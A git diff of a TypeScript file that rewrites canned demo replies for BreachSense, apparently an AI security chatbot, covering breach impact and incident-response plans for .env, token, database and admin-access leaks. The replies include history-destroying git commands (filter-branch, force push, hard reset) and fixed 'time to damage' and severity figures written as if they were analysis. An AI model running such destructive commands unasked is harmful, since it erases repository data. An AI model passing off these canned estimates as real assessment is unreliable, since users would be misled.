+├── 11. Engage legal for compliance requirements
+└── 12. Implement database activity monitoring
+\`\`\`
+
+---
+
+### RESPONSIBLE TEAMS
+
+| Team | Action Required | Deadline |
+|------|-----------------|----------|
+| DBA/DevOps | Rotate credentials, restrict access | IMMEDIATE |
+| Security | Forensic analysis, scope assessment | 1 HOUR |
+| Backend Dev | Update connection strings, redeploy | 2 HOURS |
+| Legal | Compliance assessment, notifications | 24 HOURS |
+
+---
+
+*This response was generated by BreachSense running across ChatSDK platforms (Slack + Discord ready).*`;
   }
 
   // Generic breach analysis
-  return `## Breach Impact Analysis: ${incident}
+  return `## GLOBAL BREACH IMPACT ANALYSIS
 
+**Incident:** ${incident}
 **Your Application:** ${context.target}
 **Domain:** ${domain}
-**Tech Stack:** ${techStack.join(", ")}
 
 ---
 
-### General Impact Assessment
+### SEVERITY: MEDIUM-HIGH
 
-This section analyzes how **${incident}** could affect your application at **${domain}**.
-
----
-
-### Potential Exposure Areas for ${domain}
-
-| Area | Risk Level | Likelihood |
-|------|------------|------------|
-| User Data | HIGH | Depends on breach scope |
-| Credentials | HIGH | If stored in affected system |
-| Business Logic | MEDIUM | Source code exposure |
-| Infrastructure | MEDIUM | Config/secrets exposure |
-| Third-Party Data | LOW-MEDIUM | API integrations |
+**Time Sensitivity:** Assess within 24 hours
+**Confidence:** MEDIUM (Requires further investigation)
 
 ---
 
-### Questions to Assess Impact
+### WHY YOU MAY BE AFFECTED
 
-1. **Does ${domain} use or integrate with the breached service?**
-   - If YES: High priority assessment needed
-   - If NO: Monitor for secondary effects
+Your application **${domain}** could be impacted if:
 
-2. **What data does the integration have access to?**
-   - User PII?
-   - Payment information?
-   - Authentication tokens?
+1. **Direct Integration:** You use the breached service/component
+2. **Shared Dependencies:** You share libraries or infrastructure
+3. **Data Overlap:** User data exists in both systems
+4. **Credential Reuse:** Same credentials used elsewhere
 
-3. **Are there shared credentials?**
-   - Same passwords used elsewhere?
-   - Shared API keys?
-   - Common service accounts?
-
----
-
-### Recommended Actions for ${domain}
-
-**Discovery Phase:**
-- Map all integrations with affected service
-- Identify shared credentials or data
-- Review access logs for anomalies
-
-**Containment Phase:**
-- Rotate any potentially exposed credentials
-- Enable enhanced monitoring
-- Prepare incident response team
-
-**Recovery Phase:**
-- Implement additional security controls
-- Update security policies
-- Document lessons learned
+**Assessment Questions:**
+\`\`\`
+□ Does ${domain} integrate with the breached service?
+□ Do you share any credentials with the breached system?
+□ Do your users have accounts on the breached platform?
+□ Are any dependencies affected by this breach?
+\`\`\`
 
 ---
 
-### Run Specific Analysis
+### POTENTIAL DAMAGE
 
-For more detailed analysis, try:
+| Scenario | Likelihood | Impact |
+|----------|------------|--------|
+| Direct data exposure | Medium | HIGH |
+| Credential compromise | Medium | CRITICAL |
+| Supply chain attack | Low-Medium | HIGH |
+| Reputational damage | Low | MEDIUM |
+
+---
+
+### RISK LEVEL: MEDIUM (Pending Investigation)
+
+---
+
+### IMMEDIATE ACTIONS
+
+\`\`\`
+HOUR 1: DISCOVERY
+├── 1. Map all integrations with affected service
+├── 2. Identify shared credentials
+├── 3. Review access logs for anomalies
+└── 4. Check for security advisories
+
+HOUR 2-24: ASSESSMENT
+├── 5. Determine if ${domain} is affected
+├── 6. Identify scope of potential exposure
+├── 7. Prepare incident response if needed
+└── 8. Document findings
+
+IF AFFECTED:
+├── 9. Rotate compromised credentials
+├── 10. Notify stakeholders
+├── 11. Execute incident response plan
+└── 12. Monitor for abuse
+\`\`\`
+
+---
+
+### SPECIFIC ANALYSIS AVAILABLE
+
+For detailed impact analysis, try these commands:
 - \`/impact vercel breach\` - Deployment platform compromise
 - \`/impact api key leak\` - Credential exposure
 - \`/impact oauth compromise\` - Authentication provider breach
-- \`/breach .env leak\` - Environment file exposure response`;
+- \`/impact database breach\` - Database server compromise
+
+---
+
+*This response was generated by BreachSense running across ChatSDK platforms (Slack + Discord ready).*`;
 }
+
+// ============================================================
+// ENHANCED BREACH RESPONSE - /breach command
+// ============================================================
 
 export function getDemoBreachResponse(breachType: string, context: ProjectContext): string {
   const domain = extractDomain(context.target);
@@ -541,448 +865,575 @@ export function getDemoBreachResponse(breachType: string, context: ProjectContex
   const breachLower = breachType.toLowerCase();
 
   if (breachLower.includes("env") || breachLower.includes(".env") || breachLower.includes("environment")) {
-    return `## Incident Response: ${breachType}
+    return `## BREACH RESPONSE PLAN
 
+**Breach Type:** ${breachType}
 **Affected Application:** ${context.target}
 **Domain:** ${domain}
-**Severity:** CRITICAL
 
 ---
 
-### Exposure Analysis for ${domain}
+### SEVERITY: CRITICAL
 
-Your \`.env\` file likely contains these sensitive values:
+---
 
-| Variable | Purpose | Risk if Exposed |
-|----------|---------|-----------------|
+### EXPOSURE ANALYSIS
+
+Your \`.env\` file likely contains these secrets:
+
+| Variable | Purpose | If Exposed |
+|----------|---------|------------|
 | \`DATABASE_URL\` | Database connection | Full data access |
 | \`JWT_SECRET\` | Token signing | Session forgery |
 | \`API_KEYS\` | Third-party services | Service abuse |
 | \`OAUTH_SECRET\` | Authentication | Account takeover |
 | \`SMTP_PASSWORD\` | Email service | Phishing campaigns |
+| \`AWS_SECRET_KEY\` | Cloud services | Infrastructure access |
 
 ---
 
-### Immediate Response Checklist for ${domain}
+### TIME TO DAMAGE
 
-**MINUTE 1-15: Containment**
-- [ ] Remove exposed file from public access
-- [ ] Rotate \`DATABASE_URL\` credentials
-- [ ] Generate new \`JWT_SECRET\`
-- [ ] Revoke all active sessions
-- [ ] Change cloud provider passwords
+| Attack | Time Required | Automated? |
+|--------|---------------|------------|
+| Database dump | 2 minutes | YES |
+| Session hijacking | 5 minutes | YES |
+| API abuse | Immediate | YES |
+| Full compromise | 15 minutes | YES |
 
-**MINUTE 15-60: Assessment**
-- [ ] Determine exposure duration
-- [ ] Check git history for file
-- [ ] Review access logs for unauthorized use
-- [ ] Identify all affected credentials
-
-**HOUR 1-4: Rotation**
-- [ ] Rotate ALL third-party API keys:
-  ${techStack.includes("Stripe") ? "  - Stripe: dashboard.stripe.com/apikeys" : "  - Payment provider API keys"}
-  - Email service (SendGrid/Postmark/SES)
-  - Storage (AWS S3/Cloudflare R2)
-  - Analytics/Monitoring keys
-
-**HOUR 4-24: Verification**
-- [ ] Deploy with new credentials
-- [ ] Verify all integrations working
-- [ ] Monitor for unauthorized access
-- [ ] Enable secrets scanning in CI/CD
+**Attackers can fully compromise ${domain} within 15 minutes of obtaining .env file.**
 
 ---
 
-### Git History Remediation
+### PRIORITY ACTIONS (In Order)
 
-If \`.env\` was committed to git:
+\`\`\`
+PRIORITY 1 - MINUTE 0-5 [CRITICAL]
+├── □ Remove exposed .env from public access
+├── □ Rotate DATABASE_URL credentials
+│      Command: ALTER USER app_user WITH PASSWORD 'new_secure_password';
+├── □ Generate new JWT_SECRET
+│      Command: openssl rand -base64 32
+└── □ Force-terminate all active sessions
+
+PRIORITY 2 - MINUTE 5-30 [HIGH]
+├── □ Rotate third-party API keys:
+│      ├── Stripe: dashboard.stripe.com/apikeys
+│      ├── SendGrid: app.sendgrid.com/settings/api_keys  
+│      └── AWS: Regenerate in IAM console
+├── □ Change cloud provider passwords
+├── □ Review recent API activity for abuse
+└── □ Check for unauthorized transactions
+
+PRIORITY 3 - HOUR 1-4 [MEDIUM]
+├── □ Audit git history for exposure
+│      Command: git log --all --full-history -- .env
+├── □ If committed, rewrite git history
+├── □ Deploy application with new credentials
+└── □ Enable monitoring for credential usage
+
+PRIORITY 4 - DAY 1-2 [RECOVERY]
+├── □ Implement secrets manager (Vault, AWS Secrets Manager)
+├── □ Add pre-commit hooks to block .env commits
+├── □ Document incident for compliance
+└── □ Conduct team security training
+\`\`\`
+
+---
+
+### WHO SHOULD ACT
+
+| Priority | Team | Responsibility | Deadline |
+|----------|------|---------------|----------|
+| 1 | Backend Dev | Rotate DB credentials, JWT secret | 5 MINUTES |
+| 2 | DevOps | Rotate cloud/API keys | 30 MINUTES |
+| 3 | Security | Audit logs, assess damage | 1 HOUR |
+| 4 | Lead/Manager | Stakeholder notification | 2 HOURS |
+| 5 | Legal | Compliance assessment | 24 HOURS |
+
+---
+
+### GIT HISTORY CLEANUP
+
+If .env was committed to git:
 
 \`\`\`bash
-# Remove from history (destructive - backup first!)
+# Remove from ALL history (destructive!)
 git filter-branch --force --index-filter \\
   "git rm --cached --ignore-unmatch .env" \\
   --prune-empty --tag-name-filter cat -- --all
 
 # Force push (coordinate with team!)
 git push origin --force --all
-git push origin --force --tags
 
-# All team members must:
-git fetch origin
-git reset --hard origin/main
+# Team members must:
+git fetch origin && git reset --hard origin/main
 \`\`\`
 
 ---
 
-### Prevention for ${domain}
+### PREVENTION CHECKLIST
 
-1. **Immediate:** Add to \`.gitignore\`:
-   \`\`\`
-   .env
-   .env.local
-   .env.*.local
-   \`\`\`
-
-2. **CI/CD:** Add pre-commit hook:
-   \`\`\`bash
-   # .git/hooks/pre-commit
-   if git diff --cached --name-only | grep -q ".env"; then
-     echo "ERROR: Attempting to commit .env file!"
-     exit 1
-   fi
-   \`\`\`
-
-3. **Long-term:** Use secrets manager:
-   - Vercel: Environment Variables UI
-   - AWS: Secrets Manager
-   - HashiCorp Vault
+- [ ] Add \`.env\` to \`.gitignore\`
+- [ ] Install pre-commit hook to block secrets
+- [ ] Use environment variables in CI/CD
+- [ ] Implement secrets manager
+- [ ] Enable GitHub secret scanning
+- [ ] Regular credential rotation policy
 
 ---
 
-### Compliance Notifications
+*This response was generated by BreachSense running across ChatSDK platforms (Slack + Discord ready).*`;
+  }
+
+  if (breachLower.includes("token") || breachLower.includes("jwt") || breachLower.includes("session")) {
+    return `## BREACH RESPONSE PLAN
+
+**Breach Type:** ${breachType}
+**Affected Application:** ${context.target}
+**Domain:** ${domain}
+
+---
+
+### SEVERITY: CRITICAL
+
+---
+
+### EXPOSURE ANALYSIS
+
+Token exposure allows attackers to:
+
+| Capability | With Stolen Token | Impact |
+|------------|-------------------|--------|
+| Impersonate users | Use token as auth | CRITICAL |
+| Access data | Bypass authentication | CRITICAL |
+| Perform actions | As the token owner | HIGH |
+| Persist access | Until token expires | HIGH |
+
+**If JWT_SECRET exposed:**
+- Attackers can FORGE tokens for ANY user
+- Can create admin tokens
+- Can never be detected by token validation
+
+---
+
+### TIME TO DAMAGE
+
+| Attack | Time Required | Impact |
+|--------|---------------|--------|
+| Session hijacking | Immediate | User impersonation |
+| Token forging | 1 minute | Any user access |
+| Admin access | 2 minutes | Full system control |
+| Data exfiltration | 5 minutes | Complete data theft |
+
+---
+
+### PRIORITY ACTIONS (In Order)
+
+\`\`\`
+PRIORITY 1 - IMMEDIATE [CRITICAL]
+├── □ Invalidate ALL active sessions/tokens
+│      └── Clear session store, revoke refresh tokens
+├── □ Regenerate JWT_SECRET
+│      Command: openssl rand -base64 64
+├── □ Deploy with new secret
+└── □ Force re-authentication for all users
+
+PRIORITY 2 - WITHIN 30 MINUTES [HIGH]
+├── □ Review auth logs for suspicious activity
+│      └── Look for unusual IPs, bulk operations
+├── □ Check for unauthorized admin actions
+├── □ Identify potentially compromised accounts
+└── □ Implement token blacklist if not present
+
+PRIORITY 3 - WITHIN 2 HOURS [MEDIUM]
+├── □ Notify affected users to re-login
+├── □ Reset passwords for high-privilege accounts
+├── □ Add session binding (IP, device fingerprint)
+└── □ Implement refresh token rotation
+
+PRIORITY 4 - WITHIN 24 HOURS [RECOVERY]
+├── □ Add anomaly detection for token usage
+├── □ Implement shorter token expiration
+├── □ Add step-up auth for sensitive operations
+└── □ Document and report incident
+\`\`\`
+
+---
+
+### WHO SHOULD ACT
+
+| Priority | Team | Responsibility | Deadline |
+|----------|------|---------------|----------|
+| 1 | Backend Dev | Rotate secrets, invalidate sessions | IMMEDIATE |
+| 2 | Security | Analyze logs, identify compromise | 30 MINUTES |
+| 3 | DevOps | Deploy updates, monitor | 1 HOUR |
+| 4 | Support | Handle user re-auth issues | 2 HOURS |
+
+---
+
+*This response was generated by BreachSense running across ChatSDK platforms (Slack + Discord ready).*`;
+  }
+
+  if (breachLower.includes("database") || breachLower.includes("db") || breachLower.includes("sql") || breachLower.includes("data")) {
+    return `## BREACH RESPONSE PLAN
+
+**Breach Type:** ${breachType}
+**Affected Application:** ${context.target}
+**Domain:** ${domain}
+
+---
+
+### SEVERITY: CRITICAL
+
+---
+
+### EXPOSURE ANALYSIS
+
+Database exposure impacts:
+
+| Data Type | Risk Level | Consequence |
+|-----------|------------|-------------|
+| User credentials | CRITICAL | Account takeover |
+| Personal info (PII) | CRITICAL | Identity theft |
+| Payment data | CRITICAL | Financial fraud |
+| Business data | HIGH | Competitive loss |
+| Session tokens | HIGH | Impersonation |
+
+---
+
+### TIME TO DAMAGE
+
+| Attack | Time Required | Recoverable? |
+|--------|---------------|--------------|
+| Data export | 5 minutes | NO - data is copied |
+| Data modification | 2 minutes | Partial - from backups |
+| Data deletion | 1 minute | Partial - from backups |
+| Backdoor creation | 10 minutes | YES - with detection |
+
+---
+
+### PRIORITY ACTIONS (In Order)
+
+\`\`\`
+PRIORITY 1 - IMMEDIATE [CRITICAL]
+├── □ Rotate database credentials
+│      Command: ALTER USER app WITH PASSWORD 'new_password';
+├── □ Restrict network access to database
+│      └── Allow only application server IPs
+├── □ Enable query logging
+│      Command: ALTER SYSTEM SET log_statement = 'all';
+└── □ Take forensic snapshot before changes
+
+PRIORITY 2 - WITHIN 1 HOUR [HIGH]
+├── □ Analyze query logs for exfiltration
+│      └── Look for: SELECT *, bulk exports, unusual users
+├── □ Check for new users or modified permissions
+├── □ Verify data integrity against backups
+└── □ Review application code for exposed credentials
+
+PRIORITY 3 - WITHIN 24 HOURS [MEDIUM]
+├── □ Force password reset for all users
+├── □ Notify affected users (if data accessed)
+├── □ Implement database activity monitoring
+└── □ Add encryption at rest and in transit
+
+PRIORITY 4 - WITHIN 1 WEEK [RECOVERY]
+├── □ Conduct full security audit
+├── □ Implement database firewall
+├── □ Set up regular backup verification
+└── □ Create incident response documentation
+\`\`\`
+
+---
+
+### WHO SHOULD ACT
+
+| Priority | Team | Responsibility | Deadline |
+|----------|------|---------------|----------|
+| 1 | DBA | Rotate credentials, restrict access | IMMEDIATE |
+| 2 | Security | Forensic analysis, scope assessment | 1 HOUR |
+| 3 | Backend Dev | Update connection strings, redeploy | 2 HOURS |
+| 4 | Legal | Compliance assessment, notifications | 24 HOURS |
+| 5 | Comms | User notification (if needed) | 48 HOURS |
+
+---
+
+### COMPLIANCE REQUIREMENTS
 
 | Regulation | Requirement | Deadline |
 |------------|-------------|----------|
 | GDPR | DPA notification | 72 hours |
-| CCPA | User notification | "Without unreasonable delay" |
-| SOC2 | Incident documentation | 24 hours |`;
+| GDPR | User notification | Without undue delay |
+| CCPA | User notification | Most expedient time |
+| PCI-DSS | Card brand notification | 24 hours |
+| SOC2 | Incident documentation | 24 hours |
+
+---
+
+*This response was generated by BreachSense running across ChatSDK platforms (Slack + Discord ready).*`;
   }
 
-  if (breachLower.includes("database") || breachLower.includes("db") || breachLower.includes("sql") || breachLower.includes("data")) {
-    return `## Incident Response: ${breachType}
+  if (breachLower.includes("admin") || breachLower.includes("access") || breachLower.includes("unauthorized")) {
+    return `## BREACH RESPONSE PLAN
 
+**Breach Type:** ${breachType}
 **Affected Application:** ${context.target}
 **Domain:** ${domain}
-**Severity:** CRITICAL
 
 ---
 
-### Data at Risk in ${domain}
-
-| Data Type | Likely Tables | Exposure Risk |
-|-----------|---------------|---------------|
-| User Credentials | \`users\`, \`accounts\` | Password hashes, emails |
-| Personal Info | \`profiles\`, \`customers\` | Names, addresses, phone |
-| Financial Data | \`orders\`, \`payments\` | Transaction history |
-| Session Data | \`sessions\`, \`tokens\` | Active sessions |
-| Business Data | \`products\`, \`inventory\` | Proprietary information |
+### SEVERITY: CRITICAL
 
 ---
 
-### Immediate Response for ${domain}
+### EXPOSURE ANALYSIS
 
-**PHASE 1: Containment (0-1 hour)**
+Unauthorized admin access allows:
 
-\`\`\`sql
--- Immediately revoke external access
-REVOKE ALL PRIVILEGES ON ALL TABLES FROM public_user;
+| Capability | Impact | Urgency |
+|------------|--------|---------|
+| Full system control | CRITICAL | IMMEDIATE |
+| User data access | CRITICAL | IMMEDIATE |
+| Configuration changes | HIGH | IMMEDIATE |
+| Backdoor creation | HIGH | IMMEDIATE |
+| Service disruption | HIGH | IMMEDIATE |
 
--- Force disconnect all sessions
-SELECT pg_terminate_backend(pid) 
-FROM pg_stat_activity 
-WHERE datname = 'production';
+---
 
--- Enable audit logging
-ALTER SYSTEM SET log_statement = 'all';
-SELECT pg_reload_conf();
+### TIME TO DAMAGE
+
+| Attack | Time Required | Detection Difficulty |
+|--------|---------------|---------------------|
+| Create backdoor account | 1 minute | MEDIUM |
+| Export user database | 5 minutes | LOW |
+| Modify system settings | 2 minutes | MEDIUM |
+| Delete audit logs | 1 minute | HIGH |
+| Plant persistent access | 10 minutes | HIGH |
+
+---
+
+### PRIORITY ACTIONS (In Order)
+
+\`\`\`
+PRIORITY 1 - IMMEDIATE [CRITICAL]
+├── □ Terminate ALL admin sessions
+├── □ Reset ALL admin passwords
+├── □ Review admin user list for unauthorized accounts
+│      └── Check: New accounts, modified roles, unusual emails
+├── □ Enable enhanced logging
+└── □ Preserve audit logs (forensic evidence)
+
+PRIORITY 2 - WITHIN 30 MINUTES [HIGH]
+├── □ Review recent admin actions
+│      └── Look for: Setting changes, user modifications, exports
+├── □ Check for API keys created by attacker
+├── □ Review webhook configurations
+├── □ Check for scheduled tasks/cron jobs added
+└── □ Verify email/notification settings unchanged
+
+PRIORITY 3 - WITHIN 2 HOURS [MEDIUM]
+├── □ Force MFA enrollment for all admins
+├── □ Implement IP allowlisting for admin access
+├── □ Add step-up authentication for sensitive ops
+└── □ Deploy session anomaly detection
+
+PRIORITY 4 - WITHIN 24 HOURS [RECOVERY]
+├── □ Full security audit of admin actions
+├── □ Review and update access policies
+├── □ Implement admin access reviews
+└── □ Document incident and lessons learned
 \`\`\`
 
-**PHASE 2: Assessment (1-4 hours)**
+---
 
-\`\`\`sql
--- Check for data exfiltration
-SELECT usename, query, query_start 
-FROM pg_stat_activity 
-WHERE query ILIKE '%SELECT%FROM%users%'
-ORDER BY query_start DESC;
+### WHO SHOULD ACT
 
--- Review recent large exports
-SELECT * FROM pg_stat_user_tables 
-WHERE n_tup_ins > 1000 OR n_tup_del > 100;
-\`\`\`
-
-**PHASE 3: User Protection (4-24 hours)**
-- [ ] Force password reset for all users
-- [ ] Invalidate all session tokens
-- [ ] Enable enhanced login monitoring
-- [ ] Notify affected users
+| Priority | Team | Responsibility | Deadline |
+|----------|------|---------------|----------|
+| 1 | Security | Terminate sessions, preserve evidence | IMMEDIATE |
+| 2 | Backend Dev | Reset credentials, review accounts | 15 MINUTES |
+| 3 | DevOps | Check infrastructure for changes | 30 MINUTES |
+| 4 | Lead/CTO | Assess impact, stakeholder comms | 1 HOUR |
 
 ---
 
-### Password Security Verification
-
-Check your password hashing:
-
-\`\`\`javascript
-// SECURE - bcrypt with cost factor >= 12
-const hash = await bcrypt.hash(password, 12);
-
-// INSECURE - MD5/SHA1 (change immediately!)
-// If you find: crypto.createHash('md5')
-// Or: crypto.createHash('sha1')
-// Users are at HIGH RISK
-\`\`\`
-
-If using weak hashing, users should:
-1. Reset passwords immediately
-2. Be notified their credentials may be compromised
-3. Check for credential reuse on other sites
-
----
-
-### Recovery Checklist for ${domain}
-
-| Task | Status | Owner |
-|------|--------|-------|
-| Database credentials rotated | [ ] | DevOps |
-| Connection strings updated | [ ] | DevOps |
-| All users force logged out | [ ] | Backend |
-| Password reset emails sent | [ ] | Backend |
-| Audit logs preserved | [ ] | Security |
-| Forensic snapshot taken | [ ] | Security |
-| Law enforcement notified | [ ] | Legal |
-| User notification sent | [ ] | Comms |`;
+*This response was generated by BreachSense running across ChatSDK platforms (Slack + Discord ready).*`;
   }
 
   // Generic breach response
-  return `## Incident Response: ${breachType}
+  return `## BREACH RESPONSE PLAN
 
+**Breach Type:** ${breachType}
 **Affected Application:** ${context.target}
 **Domain:** ${domain}
-**Tech Stack:** ${techStack.join(", ")}
 
 ---
 
-### Response Framework for ${domain}
+### SEVERITY: HIGH
 
-#### Phase 1: Identification (0-30 minutes)
-
-**Determine Scope:**
-- What systems are affected?
-- What data was potentially exposed?
-- How long was the exposure?
-- Who discovered the breach?
-
-**Document Everything:**
-- [ ] Timestamp of discovery
-- [ ] Initial findings
-- [ ] Systems involved
-- [ ] Personnel notified
+**Time Sensitivity:** Assess and respond within 4 hours
+**Confidence:** MEDIUM
 
 ---
 
-#### Phase 2: Containment (30 min - 2 hours)
+### EXPOSURE ANALYSIS
 
-**Immediate Actions for ${domain}:**
+General security breach involving: **${breachType}**
 
-| Action | Priority | Status |
-|--------|----------|--------|
-| Isolate affected systems | CRITICAL | [ ] |
-| Preserve evidence/logs | CRITICAL | [ ] |
-| Rotate exposed credentials | HIGH | [ ] |
-| Enable enhanced monitoring | HIGH | [ ] |
-| Notify incident team | HIGH | [ ] |
-
-**DO NOT:**
-- Delete logs or evidence
-- Shut down systems without forensic capture
-- Communicate externally before legal review
-- Attempt to "fix" without documentation
+| Risk Area | Assessment Needed | Priority |
+|-----------|------------------|----------|
+| Data exposure | Determine what data is affected | HIGH |
+| Access compromise | Identify unauthorized access | HIGH |
+| System integrity | Verify no modifications made | MEDIUM |
+| Persistence | Check for backdoors | MEDIUM |
 
 ---
 
-#### Phase 3: Eradication (2-24 hours)
+### TIME TO DAMAGE
 
-**Remove Threat:**
-- Identify root cause
-- Remove malicious access
-- Patch vulnerabilities
-- Verify clean state
+| If Unaddressed | Consequence |
+|----------------|-------------|
+| 1 hour | Initial exploitation possible |
+| 4 hours | Data exfiltration likely |
+| 24 hours | Persistent access established |
+| 1 week | Full compromise probable |
 
-**Credential Rotation for ${domain}:**
+---
+
+### PRIORITY ACTIONS
+
 \`\`\`
-Priority 1: Database credentials
-Priority 2: API keys and tokens
-Priority 3: Service accounts
-Priority 4: User sessions (force re-auth)
+PRIORITY 1 - WITHIN 1 HOUR [CRITICAL]
+├── □ Identify scope of the breach
+├── □ Contain affected systems
+├── □ Preserve evidence/logs
+└── □ Alert security team
+
+PRIORITY 2 - WITHIN 4 HOURS [HIGH]
+├── □ Rotate potentially compromised credentials
+├── □ Review access logs for anomalies
+├── □ Assess data exposure
+└── □ Implement additional monitoring
+
+PRIORITY 3 - WITHIN 24 HOURS [MEDIUM]
+├── □ Conduct forensic analysis
+├── □ Document incident timeline
+├── □ Notify stakeholders as required
+└── □ Begin remediation
+
+PRIORITY 4 - WITHIN 1 WEEK [RECOVERY]
+├── □ Complete security audit
+├── □ Implement preventive measures
+├── □ Update incident response plan
+└── □ Conduct lessons learned review
 \`\`\`
 
 ---
 
-#### Phase 4: Recovery (1-7 days)
+### WHO SHOULD ACT
 
-**Restore Operations:**
-- Deploy patched systems
-- Restore from clean backups if needed
-- Verify all integrations
-- Enhanced monitoring active
-
-**Validation Checklist:**
-- [ ] All credentials rotated
-- [ ] Vulnerabilities patched
-- [ ] Monitoring enhanced
-- [ ] Incident documented
-- [ ] Users notified (if required)
+| Team | Responsibility | Deadline |
+|------|---------------|----------|
+| Security | Lead incident response | IMMEDIATE |
+| DevOps | System isolation, monitoring | 1 HOUR |
+| Backend Dev | Credential rotation, fixes | 2 HOURS |
+| Management | Stakeholder communication | 4 HOURS |
 
 ---
 
-#### Phase 5: Lessons Learned (1-2 weeks)
+### SPECIFIC RESPONSE PLANS
 
-**Post-Incident Review:**
-- Root cause analysis
-- Timeline reconstruction
-- Control gap identification
-- Improvement recommendations
-
-**Document for ${domain}:**
-- What happened
-- How it was discovered
-- Response timeline
-- What worked well
-- What needs improvement`;
-}
-
-export function getDemoHelpMessage(): string {
-  return `## BreachSense - AI Security Agent
-
-Welcome to BreachSense! I help you analyze security vulnerabilities, simulate attacks, and respond to breaches.
-
----
-
-### Available Commands
-
-| Command | Description | Example |
-|---------|-------------|---------|
-| \`/target <url>\` | Set target application | \`/target https://myapp.vercel.app\` |
-| \`/break\` | Simulate attack on target | \`/break\` |
-| \`/impact <incident>\` | Analyze breach impact | \`/impact vercel breach\` |
-| \`/breach <type>\` | Get incident response plan | \`/breach .env leak\` |
-| \`/help\` | Show this help message | \`/help\` |
-
----
-
-### Impact Analysis Examples
-
-Analyze how external breaches affect YOUR system:
-
-- \`/impact vercel breach\` - Deployment platform compromise
-- \`/impact api key leak\` - Exposed API credentials
-- \`/impact oauth compromise\` - OAuth token exposure
-- \`/impact database breach\` - Database server breach
-- \`/impact npm supply chain\` - Dependency compromise
-
----
-
-### Breach Response Examples
-
-Get incident response guidance:
-
-- \`/breach .env leak\` - Environment file exposed
-- \`/breach token exposure\` - Auth tokens compromised
-- \`/breach database leak\` - Database credentials exposed
+For detailed response, try these commands:
+- \`/breach .env leak\` - Environment file exposure
+- \`/breach token exposure\` - Authentication token compromise
+- \`/breach database leak\` - Database credential exposure
 - \`/breach admin access\` - Unauthorized admin access
 
 ---
 
-### Quick Start
+*This response was generated by BreachSense running across ChatSDK platforms (Slack + Discord ready).*`;
+}
+
+// ============================================================
+// HELP MESSAGE
+// ============================================================
+
+export function getDemoHelpMessage(): string {
+  return `## BreachSense - AI Security Agent
+
+**Running on ChatSDK (Slack + Discord ready)**
+
+---
+
+### AVAILABLE COMMANDS
+
+| Command | Description | Example |
+|---------|-------------|---------|
+| \`/target <url>\` | Set target application | \`/target https://myapp.com\` |
+| \`/break\` | Simulate attack on target | \`/break\` |
+| \`/impact <incident>\` | Analyze breach impact | \`/impact vercel breach\` |
+| \`/breach <type>\` | Get incident response plan | \`/breach .env leak\` |
+| \`/help\` | Show this help | \`/help\` |
+
+---
+
+### IMPACT ANALYSIS EXAMPLES
+
+Analyze how external breaches affect YOUR system:
+
+| Command | Scenario |
+|---------|----------|
+| \`/impact vercel breach\` | Deployment platform compromised |
+| \`/impact api key leak\` | API credentials exposed |
+| \`/impact oauth compromise\` | Auth provider breached |
+| \`/impact database breach\` | Database server compromised |
+
+---
+
+### BREACH RESPONSE EXAMPLES
+
+Get incident response guidance:
+
+| Command | Scenario |
+|---------|----------|
+| \`/breach .env leak\` | Environment file exposed |
+| \`/breach token exposure\` | Auth tokens compromised |
+| \`/breach database leak\` | DB credentials exposed |
+| \`/breach admin access\` | Unauthorized admin access |
+
+---
+
+### QUICK START
 
 1. Set your target: \`/target https://your-app.com\`
 2. Run attack simulation: \`/break\`
 3. Analyze breach impact: \`/impact api key leak\`
 
-Click the gear icon in the header to configure your target application.`;
+---
+
+### RESPONSE FORMAT
+
+Every response includes:
+- **Severity Level** (Critical/High/Medium/Low)
+- **Time to Exploit/Damage**
+- **Confidence Level**
+- **Priority Actions** with responsible teams
+- **Compliance requirements** where applicable
+
+---
+
+*BreachSense: AI security that thinks like an attacker.*`;
 }
+
+// ============================================================
+// GENERAL RESPONSE
+// ============================================================
 
 export function getDemoGeneralResponse(query: string, context: ProjectContext): string {
   const domain = extractDomain(context.target);
   const techStack = inferTechStack(context.target);
-  const lowerQuery = query.toLowerCase();
   
-  // Check for security-related keywords
-  if (lowerQuery.includes("vulnerability") || lowerQuery.includes("vuln")) {
-    return `## Vulnerability Assessment for ${domain}
-
-Based on the target **${context.target}**, here are common vulnerability categories to check:
-
-### Web Application Vulnerabilities
-- **Injection Attacks** - SQL, NoSQL, Command injection
-- **Broken Authentication** - Weak passwords, session hijacking
-- **Sensitive Data Exposure** - Unencrypted data, PII leaks
-- **XML External Entities (XXE)** - XML parser vulnerabilities
-- **Broken Access Control** - Privilege escalation, IDOR
-- **Security Misconfiguration** - Default settings, verbose errors
-- **Cross-Site Scripting (XSS)** - Reflected, Stored, DOM-based
-- **Insecure Deserialization** - Object manipulation
-- **Using Components with Known Vulnerabilities** - Outdated dependencies
-- **Insufficient Logging** - Missing audit trails
-
-**Recommended Action:** Run \`/break\` to simulate an attack and identify specific vulnerabilities.`;
-  }
-  
-  if (lowerQuery.includes("secure") || lowerQuery.includes("harden") || lowerQuery.includes("protect")) {
-    return `## Security Hardening Recommendations for ${domain}
-
-### Detected Technology Stack
-${techStack.map(t => `- ${t}`).join("\n")}
-
-### Immediate Security Actions
-
-**1. Authentication & Access**
-- Implement MFA for all admin accounts
-- Use secure session management
-- Apply principle of least privilege
-
-**2. Data Protection**
-- Encrypt data at rest and in transit
-- Implement proper key management
-- Regular backup verification
-
-**3. Infrastructure**
-- Enable WAF protection
-- Configure security headers
-- Regular security patches
-
-**4. Monitoring**
-- Enable comprehensive logging
-- Set up intrusion detection
-- Configure alerting for anomalies
-
-**5. Code Security**
-- Regular dependency updates
-- Static code analysis
-- Security code reviews
-
-Run \`/break\` to test your current security posture.`;
-  }
-  
-  if (lowerQuery.includes("attack") || lowerQuery.includes("hack") || lowerQuery.includes("penetration")) {
-    return `## Attack Surface Analysis for ${domain}
-
-To simulate an attack on your target, use the \`/break\` command.
-
-### Common Attack Vectors
-
-**External Attacks:**
-- Network scanning and enumeration
-- Web application attacks (OWASP Top 10)
-- API endpoint abuse
-- Social engineering
-
-**Internal Threats:**
-- Insider access abuse
-- Credential theft
-- Data exfiltration
-- Privilege escalation
-
-**Supply Chain:**
-- Compromised dependencies
-- Third-party service breaches
-- CI/CD pipeline attacks
-
-**Ready to simulate?** Run \`/break\` now.`;
-  }
-  
-  // Default response
   return `## BreachSense Response
 
 **Current Target:** ${context.target}
@@ -993,24 +1444,30 @@ To simulate an attack on your target, use the \`/break\` command.
 
 I understand you're asking about: "${query}"
 
-Here's what I can help you with:
+### AVAILABLE ACTIONS
 
-### Security Analysis Commands
-
-| Command | What it does |
+| Command | What It Does |
 |---------|-------------|
 | \`/break\` | Simulate attack on ${domain} |
 | \`/impact <breach>\` | Analyze how a breach affects your system |
